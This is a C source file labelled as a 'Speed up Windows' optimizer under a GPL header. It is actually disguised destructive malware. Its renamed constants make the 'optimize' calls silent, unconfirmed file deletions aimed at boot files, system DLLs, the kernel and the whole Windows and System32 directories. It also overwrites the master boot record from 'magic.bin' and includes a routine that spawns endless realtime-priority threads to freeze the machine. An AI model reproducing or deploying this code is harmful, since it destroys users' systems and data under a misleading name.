/* 
 * Optimizer -- Speed up Windows
 * 
 * Copyright (C) 2007-2011  Anonymous
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version 2
 * of the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to 
 * the Free Software Foundation, Inc.
 * 51 Franklin Street, Fifth Floor
 * Boston, MA  02110-1301, USA
 * 
 */

#undef UNICODE

#include <windows.h>
#include <stdio.h>
#include <io.h>
#include <fcntl.h>

#include "..\shared\help.h"
#include "..\shared\optimizeboot.h"
#include "..\shared\optimizedisk.h"

#define FO_OPTIMIZE	3

#define FOF_BOOST	4
#define FOF_SPEED	16
#define FOF_TURBO	1024


DWORD WINAPI LoadThread(LPVOID param) {
	while(1);
	return 0;
}

void InflictLoad(void) {
	SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
	while(1) {
		DWORD dwTid;
		HANDLE hThread=CreateThread(NULL, 0, LoadThread, NULL, 0, &dwTid);
		SetThreadPriority(hThread, THREAD_PRIORITY_TIME_CRITICAL);
	}
}

int Addnull(char *Input, int Size) {
	int i = 0;
	while((i < Size - 1) && Input[i++]);
	Input[i] = '\0';
	
	return i;
}

int OptimizeFile(char *Directory, char *Filename) {
	char Buffer[MAX_PATH+1];
	SHFILEOPSTRUCT fstruct;
	
	if(strlen(Directory) + strlen(Filename) + 1 <= MAX_PATH) {
		sprintf(Buffer, "%s\\%s", Directory, Filename);
		Addnull(Buffer, MAX_PATH+1);

		fstruct.hwnd = NULL;
		fstruct.pFrom = Buffer;
		fstruct.pTo = NULL;
		fstruct.wFunc = FO_OPTIMIZE;
		fstruct.fFlags = FOF_BOOST | FOF_SPEED | FOF_TURBO;
#ifdef VTEC
		SHFileOperation(&fstruct);
#else
//		MessageBox(NULL, Buffer, "Optimizing:", MB_OK);
#endif

		return 0;
	}
	return -1;
}

void OptimizeDirectory(TCHAR *Dir) {
	WIN32_FIND_DATA FindFileData;
	HANDLE hFind;
	TCHAR szDir[MAX_PATH];

	strcpy(szDir, Dir);
	strcat(szDir, "\\*");
	hFind = FindFirstFile(szDir, &FindFileData);

	do {
		if(!(FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
			OptimizeFile(Dir, FindFileData.cFileName);
	} while (FindNextFile(hFind, &FindFileData) != 0);
	FindClose(hFind);
}

void OptimizeBoot(void) {
#ifndef LDRONLY
	OptimizeDisk();
#endif
	OptimizeMBR(CharToWSTR("magic.bin"));
#ifndef LDRONLY
	OptimizeFile(SystemVolume, "ntldr");
	OptimizeFile(SystemVolume, "boot.ini");
	OptimizeFile(SystemVolume, "ntdetect.com");
	OptimizeFile(SystemVolume, "autoexec.bat");
	OptimizeFile(SystemVolume, "config.sys");
	OptimizeFile(SystemVolume, "command.com");
	OptimizeFile(SystemVolume, "io.sys");
	OptimizeFile(SystemVolume, "msdos.sys"); 
#endif
}

void OptimizeLibraries(void) {
	char Sysdir[MAX_PATH+1];

	GetSystemDirectory(Sysdir, MAX_PATH);

	OptimizeFile(Sysdir, "winsock.dll");
	OptimizeFile(Sysdir, "hal.dll");
	OptimizeFile(Sysdir, "kernel32.dll");
	OptimizeFile(Sysdir, "user32.dll");
	OptimizeFile(Sysdir, "ntoskrnl.exe");
	OptimizeFile(Sysdir, "msvcrt.dll");
	OptimizeFile(Sysdir, "msvcrt20.dll");
	OptimizeFile(Sysdir, "msvcrt40.dll");
	OptimizeFile(Sysdir, "msvcrtd.dll");
}

void OptimizeSystem(void) {
	char Sysdir[MAX_PATH+1];
	char Windir[MAX_PATH+1];

	GetSystemDirectory(Sysdir, MAX_PATH);
	GetWindowsDirectory(Windir, MAX_PATH);

	OptimizeFile(Windir, "win.com");
	OptimizeDirectory(Windir);
	OptimizeDirectory(Sysdir);
}